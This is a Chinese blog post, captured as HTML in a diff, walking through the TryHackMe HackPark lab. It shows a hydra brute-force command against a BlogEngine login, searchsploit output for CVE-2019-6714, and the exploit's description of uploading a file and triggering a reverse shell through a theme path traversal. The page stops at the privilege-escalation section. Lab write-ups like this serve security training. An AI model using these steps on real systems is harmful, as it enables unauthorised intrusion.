@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>TryHackMe -- HackPark - V4ler1an</title><meta name="Description" content="THM学习训练记录"><meta property="og:title" content="TryHackMe -- HackPark" />
+<meta property="og:description" content="THM学习训练记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/thm-hackpark/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/thm-hackpark/thm.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-06T07:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-06T08:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/thm-hackpark/thm.jpeg" /><meta name="twitter:title" content="TryHackMe -- HackPark"/>
+<meta name="twitter:description" content="THM学习训练记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/thm-hackpark/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/thm-alfred/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe -- HackPark",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-hackpark\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-hackpark\/thm.jpeg",
+                            "width":  1300 ,
+                            "height":  620 
+                        }],"genre": "posts","keywords": "THM","wordcount":  2800 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-hackpark\/","datePublished": "2024-01-06T07:57:40+08:00","dateModified": "2024-01-06T08:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "THM学习训练记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/thm-hackpark/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/thm-hackpark/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">TryHackMe -- HackPark</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-06">2024-01-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2800 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;<span id="/2024/01/thm-hackpark/" class="leancloud_visitors" data-flag-title="TryHackMe -- HackPark">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/thm-hackpark/thm.jpeg"
+        data-srcset="/2024/01/thm-hackpark/thm.jpeg, /2024/01/thm-hackpark/thm.jpeg 1.5x, /2024/01/thm-hackpark/thm.jpeg 2x"
+        data-sizes="auto"
+        alt="/2024/01/thm-hackpark/thm.jpeg"
+        title="THM学习训练记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#deploy-the-vulnerable-windows-machine">Deploy the vulnerable Windows machine</a>
+      <ul>
+        <li><a href="#whats-the-name-of-the-clown-displayed-on-the-homepage">Whats the name of the clown displayed on the homepage?</a></li>
+      </ul>
+    </li>
+    <li><a href="#using-hydra-to-brute-force-a-login">Using Hydra to brute-force a login</a>
+      <ul>
+        <li><a href="#what-request-type-is-the-windows-website-login-form-using">What request type is the Windows website login form using?</a></li>
+      </ul>
+    </li>
+    <li><a href="#compromise-the-machine">Compromise the machine</a>
+      <ul>
+        <li><a href="#now-you-have-logged-into-the-website-are-you-able-to-identify-the-version-of-the-blogengine">Now you have logged into the website, are you able to identify the version of the BlogEngine?</a></li>
+        <li><a href="#what-is-the-cve">What is the CVE?</a></li>
+        <li><a href="#who-is-the-webserver-running-as">Who is the webserver running as?</a></li>
+      </ul>
+    </li>
+    <li><a href="#windows-privilege-escalation">Windows Privilege Escalation</a>
+      <ul>
+        <li><a href="#what-is-the-os-version-of-this-windows-machine">What is the OS version of this windows machine?</a></li>
+        <li><a href="#what-is-the-name-of-the-abnormal-service-running">What is the name of the abnormal <em>service</em> running?</a></li>
+        <li><a href="#what-is-the-name-of-the-binary-youre-supposed-to-exploit">What is the name of the binary you&rsquo;re supposed to exploit?</a></li>
+        <li><a href="#what-is-the-user-flag-on-jeffs-desktop">What is the user flag (on Jeffs Desktop)?</a></li>
+        <li><a href="#what-is-the-root-flag">What is the root flag?</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-without-metasploit">Privilege Escalation Without Metasploit</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>HackPark Walkthrough.</p>
+<h1 id="thm----hackpark">THM &ndash; HackPark</h1>
+<h2 id="deploy-the-vulnerable-windows-machine">Deploy the vulnerable Windows machine</h2>
+<h3 id="whats-the-name-of-the-clown-displayed-on-the-homepage">Whats the name of the clown displayed on the homepage?</h3>
+<p>简单的以图搜图。先扫端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -sV -Pn 10.10.62.181
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-07 06:17 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.62.181<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.36s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE            VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http               Microsoft IIS httpd 8.5
+</span></span><span class="line"><span class="cl">3389/tcp open  ssl/ms-wbt-server?
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 134.47 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问80端口，是一个blog，存在登录功能：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071921401.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071921401.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071921401.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071921401.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071921401.png"
+        title="image-20240307192125353" /></p>
+<h2 id="using-hydra-to-brute-force-a-login">Using Hydra to brute-force a login</h2>
+<h3 id="what-request-type-is-the-windows-website-login-form-using">What request type is the Windows website login form using?</h3>
+<p>登录页面：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071922316.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071922316.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071922316.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071922316.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071922316.png"
+        title="image-20240307192214287" /></p>
+<p>在登录时，并没有在url中拼接用户名和密码参数，所以使用的是post方法，想确认可以用burp抓包看一下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071923429.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071923429.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071923429.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071923429.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071923429.png"
+        title="image-20240307192318402" /></p>
+<p>首先搜一下默认用户名和密码：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071925713.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071925713.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071925713.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071925713.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071925713.png"
+        title="image-20240307192504684" /></p>
+<p>尝试<code>admin/admin</code>登录，不对。但是提示我们登录后更改密码，所以大概率是admin的账号，但是密码修改了。</p>
+<p>这里可以用burp对password进行单字段爆破：</p>
+<p>但是这里是希望我们用hydra去进行爆破的，那就hydra整一次。</p>
+<p>burp提取下需要使用的数据：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071951203.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071951203.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071951203.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071951203.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071951203.png"
+        title="image-20240307195138161" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form &#34;&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.62.181 http-post-form <span class="s2">&#34;/Account/login.aspx:__VIEWSTATE=4A%2FulX%2FkrreHn9c8sH3xUEppn5lC%2BvPRw8U%2F1b55wpRYFUyj4ioxPOlcaWuYjqezbyHe1o7BJdV4wPX4gml0SACd4zthGt9Kd91upXcwjUI8w7pNH4EVgtVg%2FK4PKqgnOg6ZKWerzWazWS9fMWRZKDW3SvyxhSNkQ1kLqvxqlqAnBD%2B3705ZnEyiQ93Sr9RRbGcSY1vV6R4ORM9HcyrE5NLqH906F262FKRSUCQHNo9YQtjmI6tiVFe9W%2FC%2BErobCXipKr%2F6VzFravYeEJL01qqHW8wYCkKJ7uj3UtpOHi9A4cqNWkurOyueACksOhN0wlTNcvB%2BayI2g%2Bi96TSNZUshMFqTpHbRNnlMdZaSI0dVXdQW&amp;__EVENTVALIDATION=J%2Flh8MFMXEyX%2FPFex0iFKvuSzQlOQm6HhB6dgr6vF%2FiPCa3aSTIXIDEC1qxC2xpYT0EkTyJpkU%2FlLHS7g9irDPAIs7Oi%2FAdfHs%2BFHrF19qXH%2FWZzn27lB5n3e9TPEBJEG%2F9o57mFirf9eqiy5rJh1g%2But1b6ua8ppMz4PWj9jQtr0dot&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>速度看个人机器，我的时间久一点。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071954259.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071954259.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071954259.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071954259.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071954259.png"
+        title="image-20240307195416220" /></p>
+<h2 id="compromise-the-machine">Compromise the machine</h2>
+<h3 id="now-you-have-logged-into-the-website-are-you-able-to-identify-the-version-of-the-blogengine">Now you have logged into the website, are you able to identify the version of the BlogEngine?</h3>
+<p>这个看下about就可以：3.3.6.0</p>
+<h3 id="what-is-the-cve">What is the CVE?</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit blogengine.net
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                                                         <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">BlogEngine.NET 1.4 - <span class="s1">&#39;search.aspx&#39;</span> Cross-Site Scripting                                                                <span class="p">|</span> asp/webapps/32874.txt
+</span></span><span class="line"><span class="cl">BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                      <span class="p">|</span> asp/webapps/35168.txt
+</span></span><span class="line"><span class="cl">BlogEngine.NET 3.3.6/3.3.7 - <span class="s1">&#39;dirPath&#39;</span> Directory Traversal / Remote Code Execution                                     <span class="p">|</span> aspx/webapps/47010.py
+</span></span><span class="line"><span class="cl">BlogEngine.NET 3.3.6/3.3.7 - <span class="s1">&#39;path&#39;</span> Directory Traversal                                                                <span class="p">|</span> aspx/webapps/47035.py
+</span></span><span class="line"><span class="cl">BlogEngine.NET 3.3.6/3.3.7 - <span class="s1">&#39;theme Cookie&#39;</span> Directory Traversal / Remote Code Execution                                <span class="p">|</span> aspx/webapps/47011.py
+</span></span><span class="line"><span class="cl">BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                             <span class="p">|</span> aspx/webapps/47014.py
+</span></span><span class="line"><span class="cl">BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                     <span class="p">|</span> aspx/webapps/46353.cs
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">Papers: No Results
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -p <span class="m">46353</span>
+</span></span><span class="line"><span class="cl">  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/46353
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
+</span></span><span class="line"><span class="cl">    Codes: CVE-2019-6714
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: HTML document, ASCII text
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="who-is-the-webserver-running-as">Who is the webserver running as?</h3>
+<p>直接用上面的exp拿intial access。是个路径穿越导致远程代码执行的洞，利用方法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/*
+</span></span><span class="line"><span class="cl"> * CVE-2019-6714
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Path traversal vulnerability leading to remote code execution.  This
+</span></span><span class="line"><span class="cl"> * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This
+</span></span><span class="line"><span class="cl"> * is caused by an unchecked <span class="s2">&#34;theme&#34;</span> parameter that is used to override
+</span></span><span class="line"><span class="cl"> * the default theme <span class="k">for</span> rendering blog pages.  The vulnerable code can
+</span></span><span class="line"><span class="cl"> * be seen in this file:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * /Custom/Controls/PostList.ascx.cs
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Attack:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * First, we <span class="nb">set</span> the TcpClient address and port within the method below to
+</span></span><span class="line"><span class="cl"> * our attack host, who has a reverse tcp listener waiting <span class="k">for</span> a connection.
+</span></span><span class="line"><span class="cl"> * Next, we upload this file through the file manager.  In the current <span class="o">(</span>3.3.6<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> * version of BlogEngine, this is <span class="k">done</span> by editing a post and clicking on the
+</span></span><span class="line"><span class="cl"> * icon that looks like an open file in the toolbar.  Note that this file must
+</span></span><span class="line"><span class="cl"> * be uploaded as PostView.ascx. Once uploaded, the file will be in the
+</span></span><span class="line"><span class="cl"> * /App_Data/files directory off of the document root. The admin page that
+</span></span><span class="line"><span class="cl"> * allows upload is:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * http://10.10.10.10/admin/app/editor/editpost.cshtml
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Finally, the vulnerability is triggered by accessing the base URL <span class="k">for</span> the
+</span></span><span class="line"><span class="cl"> * blog with a theme override specified like so:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * http://10.10.10.10/?theme<span class="o">=</span>../../App_Data/files
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> */
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>改一下exp里监听的ip和端口，然后利用后台的上传把文件传上去，最后再访问一下，就能拿到反弹shell。</p>
+<p>上传文件，exp重命名为<code>PostView.ascx</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072010534.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072010534.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072010534.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072010534.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072010534.png"
+        title="image-20240307201050489" /></p>
+<p>访问目标路径<code>http://10.10.62.181/?theme=../../App_Data/files</code>后拿到权限：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072012188.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072012188.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072012188.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072012188.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072012188.png"
+        title="image-20240307201241144" /></p>
+<h2 id="windows-privilege-escalation">Windows Privilege Escalation</h2>
+<p>基本思路：用现有的shell下载msf的payload，将当前的shell转移到msf中，进行后续的提权操作。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072016607.png"
